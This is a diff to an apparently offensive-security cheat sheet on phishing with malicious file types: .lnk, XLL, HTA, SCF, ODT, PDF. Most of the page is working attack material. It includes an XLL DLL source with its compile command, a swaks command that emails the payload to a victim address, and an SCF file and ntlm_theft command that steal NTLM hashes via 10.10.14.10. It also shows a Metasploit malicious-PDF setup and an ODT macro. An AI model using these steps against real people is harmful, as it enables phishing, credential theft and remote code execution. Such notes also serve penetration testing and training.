@@ -5,7 +5,16 @@ tags: ["phishing", "email", "xll", "excel", "hta", "shortcut", "Windows", "odt",
 ---
 
 ---
-### Abuse #1: Create a malicious .lnk
+{{< tab set1 tab1 active >}}lnk{{< /tab >}}
+{{< tab set1 tab2 >}}xll{{< /tab >}}
+{{< tab set1 tab3 >}}hta{{< /tab >}}
+{{< tab set1 tab4 >}}scf{{< /tab >}}
+{{< tab set1 tab5 >}}odt{{< /tab >}}
+{{< tab set1 tab6 >}}pdf{{< /tab >}}
+{{< tab set1 tab7 >}}others{{< /tab >}}
+{{< tabcontent set1 tab1 >}}
+
+<div>
 
 ```powershell
 $obj = New-Object -ComObject WScript.Shell
@@ -23,15 +32,14 @@ $link.TargetPath = "C:\ProgramData\rev.exe"
 $link.Save()
 ```
 
-<br>
+</div>
 
----
-
-### Abuse #2: Phishing with XLL (Excel)
-
-[revshells.com](https://www.revshells.com/)
+{{< /tabcontent >}}
+{{< tabcontent set1 tab2 >}}
 
 #### shell.c
+
+<div>
 
 ```c
 #include <windows.h>
@@ -60,34 +68,47 @@ BOOL APIENTRY DllMain( HMODULE hModule,
 }
 ```
 
-#### 1. Compile shell.c using Linux
+</div>
+
+#### 1. Compile shell.c in Linux
+
+<div>
 
 ```bash
 x86_64-w64-mingw32-gcc -fPIC -shared -o shell.xll shell.c -luser32
 ```
 
+</div>
+
 #### 2. Send email with the malicious xll file
+
+<div>
 
 ```bash
 swaks --to "victim@victim.com" --from "attacker@attacker.com" --server "victim.com" --header "This is not a malicious file" --body "This is not a malicious file" --attach '@shell.xll'
 ```
 
-<br>
+</div>
 
----
+<small>*Ref: [revshells.com](https://www.revshells.com/)*</small>
 
-### Abuse #3: Phishing with Shortcut
+{{< /tabcontent >}}
+{{< tabcontent set1 tab3 >}}
 
 #### 1. Start a Local SMB Server
+
+<div>
 
 ```bash
 # In our local Linux machine
 impacket-smbserver -smb2support share .
 ```
 
+</div>
+
 #### 2. Create a Malicious hta File in local Linux SMB share
 
-[revshells.com](https://www.revshells.com/)
+<div>
 
 ```html
 <html>
@@ -104,7 +125,11 @@ impacket-smbserver -smb2support share .
 </html>
 ```
 
+</div>
+
 #### 3. Create a shortcut file in target Windows
+
+<div>
 
 ```powershell
 # In target Windows machine (powershell)
@@ -123,22 +148,29 @@ $shortcutContent = "[InternetShortcut]`r`nURL=$url"
 Set-Content -Path $shortcutPath -Value $shortcutContent
 ```
 
-<br>
+</div>
 
----
+<small>*Ref: [revshells.com](https://www.revshells.com/)*</small>
 
-### Abuse #4: Phishing with Shortcut (With SMB Share Write Permission)
+{{< /tabcontent >}}
+{{< tabcontent set1 tab4 >}}
 
-If you found any interaction from target to smb share (e.g. cronjob)
+### If any interaction from target to smb share
 
 #### 1. Start Responder
+
+<div>
 
 ```bash
 # In our local Linux machine
 sudo responder -I tun0
 ```
 
+</div>
+
 #### 2. Create a malicious shortcut
+
+<div>
 
 ```evil.scf
 [Shell]
@@ -147,7 +179,11 @@ Command=2
 IconFile=\\10.10.14.10\icon
 ```
 
+</div>
+
 #### 3. Upload the malicious shortcut
+
+<div>
 
 ```bash
 # In our local Linux machine
@@ -158,11 +194,12 @@ smbclient -N \\\\10.10.11.10\\share\\
 mput evil.scf
 ```
 
-<br>
+</div>
 
----
+{{< /tabcontent >}}
+{{< tabcontent set1 tab5 >}}
 
-### Abuse #5: Phishing with odt (Open Office format)
+<div>
 
 ```
 +--------------------------------------------------------+
@@ -172,7 +209,11 @@ mput evil.scf
 +--------------------------------------------------------+
 ```
 
+</div>
+
 <br>
+
+<div>
 
 ```bash
 Sub OnLoad
@@ -180,7 +221,11 @@ Sub OnLoad
 End Sub
 ```
 
+</div>
+
 <br>
+
+<div>
 
 ```
 +-----------------------------------------------------------+
@@ -190,24 +235,12 @@ End Sub
 +-----------------------------------------------------------+
 ```
 
-<br>
+</div>
 
----
+{{< /tabcontent >}}
+{{< tabcontent set1 tab6 >}}
 
-### Abuse #6: Phishing with multiple file types
-
-[ntlm_theft](https://github.com/Greenwolf/ntlm_theft)
-
-
-```bash
-python3 ntlm_theft.py -g all -s 10.10.14.10 -f test
-```
-
-<br>
-
----
-
-### Abuse #7: Create malicious pdf file
+<div>
 
 ```bash
 msfconsole -q
@@ -228,5 +261,22 @@ set lhost 10.10.14.10
 ```bash
 exploit
 ```
+
+</div>
+
+{{< /tabcontent >}}
+{{< tabcontent set1 tab7 >}}
+
+<div>
+
+```bash
+python3 ntlm_theft.py -g all -s 10.10.14.10 -f test
+```
+
+</div>
+
+<small>*Ref: [ntlm_theft](https://github.com/Greenwolf/ntlm_theft)*</small>
+
+{{< /tabcontent >}}
 
 <br>
